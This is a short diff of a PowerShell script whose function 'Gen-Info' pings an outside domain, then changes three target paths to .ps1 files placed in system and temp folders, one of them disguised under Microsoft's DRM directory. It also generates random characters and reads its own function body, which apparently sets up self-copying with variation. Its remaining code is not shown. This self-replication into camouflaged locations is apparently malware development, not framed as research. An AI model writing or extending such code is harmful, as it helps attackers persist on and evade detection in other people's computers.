@@ -3,9 +3,9 @@ function Gen-Info {
     Test-Connection -ComputerName Secnesys.com -Count 1
 
     # CREATION
-    $alfa_path = "C:\ProgramData\Microsoft\DRM"
-    $bravo_path = "C:\Windows\Temp"
-    $charlie_path = "$env:LOCALAPPDATA\Temp"
+    $alfa_path = "C:\ProgramData\Microsoft\DRM\alfa.ps1"
+    $bravo_path = "C:\Windows\Temp\bravo.ps1"
+    $charlie_path = "$env:LOCALAPPDATA\Temp\charlie.ps1"
     
     $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
     $funcBody = (Get-Command Gen-Info).ScriptBlock.ToString()
@@ -49,4 +49,3 @@ function Gen-Info {
 }
 
 Gen-Info
-
